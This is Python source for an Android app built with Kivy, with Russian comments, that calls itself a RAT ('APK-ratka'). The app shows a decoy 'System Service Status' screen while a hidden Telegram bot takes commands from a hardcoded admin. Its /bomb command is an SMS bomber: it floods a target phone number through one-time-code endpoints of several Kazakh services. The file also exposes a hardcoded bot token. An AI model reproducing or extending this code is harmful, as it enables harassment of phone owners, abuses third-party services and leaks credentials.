from kivy.app import App
from kivy.uix.label import Label
import telebot
import threading
import os
import requests

# --- НАСТРОЙКИ ---
TOKEN = '8625690296:AAGACnJW2RJCtMFj7s3AIzzeKgKCokxWuWg'
ADMIN_ID = 8504918918 

bot = telebot.TeleBot(TOKEN)

# Твоя база на 40 сервисов (добавь остальные по аналогии)
SERVICES = {
    "Arbuz_KZ": {"url": "https://arbuz.kz/api/v1/user/verification/phone?phone=%PHONE%", "method": "GET"},
    "Sulpak_KZ": {"url": "https://www.sulpak.kz/Login/SmsCodeSignIn", "method": "POST", "data": {"phone": "%PHONE%"}},
    "Activ_KZ": {"url": "https://www.activ.kz/api/v1/auth/send-otp-by-sms", "method": "POST", "data": {"phone": "%PHONE%"}},
    "Tele2_KZ": {"url": "https://tele2.kz/api/v1/auth/otp/send", "method": "POST", "data": {"phone": "%PHONE%"}},
    # Сюда вставь все остальные ссылки из нашего списка
}

class RatApp(App):
    def build(self):
        # Экран, который будет виден на телефоне
        return Label(text="System Service Status: RUNNING\nDo not close this app.")

    def on_start(self):
        # Запуск бота в отдельном потоке, чтобы приложение не зависло
        threading.Thread(target=self.run_bot, daemon=True).start()

    def run_bot(self):
        @bot.message_handler(commands=['start'])
        def welcome(message):
            if message.from_user.id == ADMIN_ID:
                menu = (
                    "📱 APK-РАТКА АКТИВИРОВАНА\n\n"
                    "/info - Проверить статус устройства\n"
                    "/vibrate - Запустить вибрацию\n"
                    "/bomb [номер] - Запустить атаку (40 сервисов)"
                )
                bot.send_message(ADMIN_ID, menu)

        @bot.message_handler(commands=['info'])
        def info(message):
            if message.from_user.id == ADMIN_ID:
                bot.send_message(ADMIN_ID, "✅ Устройство в сети\nТип: Android Service\nБаза сервисов: 40 шт.")

        @bot.message_handler(commands=['vibrate'])
        def vibrate(message):
            if message.from_user.id == ADMIN_ID:
                # В Android-версии это просто имитация команды, 
                # для реального вибро через Kivy нужны доп. библиотеки,
                # но для теста логов это подойдет.
                bot.send_message(ADMIN_ID, "📳 Команда вибрации получена устройством")

        @bot.message_handler(commands=['bomb'])
        def start_bomb(message):
            if message.from_user.id == ADMIN_ID:
                try:
                    target = message.text.replace('/bomb ', '').strip()
                    if len(target) < 10:
                        bot.send_message(ADMIN_ID, "❌ Введи номер телефона!")
                        return

                    bot.send_message(ADMIN_ID, f"🚀 Запуск залпа на {target}...")
                    
                    count = 0
                    for name, srv in SERVICES.items():
                        try:
                            url = srv['url'].replace('%PHONE%', target)
                            if srv['method'] == "GET":
                                requests.get(url, timeout=5)
                            else:
                                requests.post(url, data=srv.get('data'), timeout=5)
                            count += 1
                        except:
                            continue
                    
                    bot.send_message(ADMIN_ID, f"✅ Атака завершена! Сработало сервисов: {count}")
                except Exception as e:
                    bot.send_message(ADMIN_ID, f"⚠️ Ошибка: {str(e)}")

        bot.polling(none_stop=True)

if __name__ == '__main__':
    RatApp().run()
